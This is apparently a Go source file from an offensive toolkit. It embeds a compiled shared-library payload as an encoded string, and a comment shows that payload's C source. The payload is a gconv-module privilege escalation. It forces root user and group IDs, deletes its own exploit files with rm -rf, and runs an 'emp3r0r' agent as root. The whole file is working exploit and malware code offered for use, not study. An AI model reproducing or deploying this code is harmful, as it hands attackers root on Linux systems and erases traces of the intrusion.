package golpe

// payload.so
// #include <stdio.h>
// #include <stdlib.h>
// #include <unistd.h>
//
// void gconv()
// {
//     return;
// }
//
// void gconv_init()
// {
//     setuid(0);
//     seteuid(0);
//     setgid(0);
//     setegid(0);
//     system("/bin/rm -rf GCONV_PATH=. lol payload.so");
//     static char* a_argv[] = { "sh", "-c", "./emp3r0r -replace", NULL };
//     static char* a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
//     execve("/bin/sh", a_argv, a_envp);
// };
//
const so_data = "QlpoOTFBWSZTWT5EhM4ABPB_____9f338_vf-_3_Xv_33_7FIsDiQKJgAdnAyFhWcNt50AP-YhoIyIVuGiNTUwkntU_KnjUjTQA9Q0DEZPUZMjQ9T1DIANADJoaHqHlMj1DQeoBoHqHtUAANEE0mCZGo9MqfpNNJk0NAANDQNABoAGgAMg0AaMnqAAANA0NAEGBNGmhpppiYmhppoYCMAjCAyYCaaMBAGABMjAJpkAyAGIaZCDAmjTQ000xMTQ000MBGARhAZMBNNGAgDAAmRgE0yAZADENMgSIiTTSRp6mp6hjU9QMIPUeptJiBgmag0AHqGg9Jp6mjQ0ANMjTExAyABiD1Hqe56mhbb5uCvLDf37unW3cabTzgqKrCCuLra5b2xUteY07Jd0Eu_dFWTBFiHCmtFeti13qBfVtLbxkvrd9l5WqO017G5IpXkNoU-9CpyIBnNfoVlFaUyis6IWVayQHoEtGlUlzrYxM00krM6jeMxTk7S1raFrUu_5ElppL1kK09rYl2s3H7FzUU-iEGDfVJKCiRRw6C41yI6SQswSSIiUZC7P0Lt8LBxXlYHLq2KGPYY3ZTOEQkRhcvy8uoAiaOPP0LiUqV1cyp-LXTQjE72RU7m9J5TQi5oNvtc3rt15GC62-w12bEur4VIVNZq5x-sv2F91zoyCQuupd1FtmxaASDC0glhgfhsR4xmkBZKIQkoYuzaMrq9DEwVASFlNBkGdCAhQvVAih_xBV3j7K5ztu0nVZk7GnuXXjoqEoxnzutwogHzAfyIFrGeA8KxMaKUEJYj7FH09vi0yaZM1TCtYbTetZg3sU6-LGfd0uaRuwIUSUV56phDutgOC0IPO38I5Q1smAjAmXmi3MhAIjYpmjUb59cdkOV3DgyG72PIYrDCOx1fMBlHeYbhv5o7Spa5TQ4e-TRM6dy3IQ3LZpqOSm7maFGofCYgyWvM3GfmU3QPpjPZOQlIwXkOfKM53PxVY70x5JBm2bk3GWFgqp-KzxiXZmTAYwLC1mQYxiWh3BlJSnRpOzlrVMSA3JCOLFkQ7DmBfYO0wp0WqxPDLxJUL4lasIQWZsevxw9vx325TB8bAD1RlQNisscEwL4zNJiopKQHjxvV_fzkXWPM3bRVt_bme57Nf5GJQHK90kYi5xk6PmuoRWFsGISEozbriLFHR5aJjD6PdZEd7KIo_wvDGXInnkKKKrL68vo8y1nxdBbtlJw8qaseUGkDBF4x795Ww2dKa8JqekIgF4NHHGp939Wui9EJeqXlZh34Q_NaHyAeWT9aHqRNMC20uwnG01NpDYp5dAYIM6WzuXbegNY5Rr94C9n14GJXGE0QgJUDGQGBpJnExXBy7CGVAiJiY6YC6RxruLta6boCWNkgpwlAQgLWt2STdgzxCD9V6R0RTYufSJkrsslCdBVBowDOkEBMJLF7XEZ2jx1SQykFyAqkYCERIjfghKXWQ31-sTi0RM3QVRISoaFWWO3Nhy1zncpmJsgkiCM4DQDW4UKbWJQq1hDxmBuB24ANeBVlwndLoKjLEd8GrYEG7qQjaTrT80bZu_uFE7m5FWNtgRXAklJiDWXGD50CA-7ADNDMdQViwJaIyUZY7P0xS1z_Z0YIcIg373si_dedmcW9Cta0ARo9SKDPhGk0jGaelpRKDR2W9-D_c_S-_8O_-e_4u5IpwoSB8iQmcA="
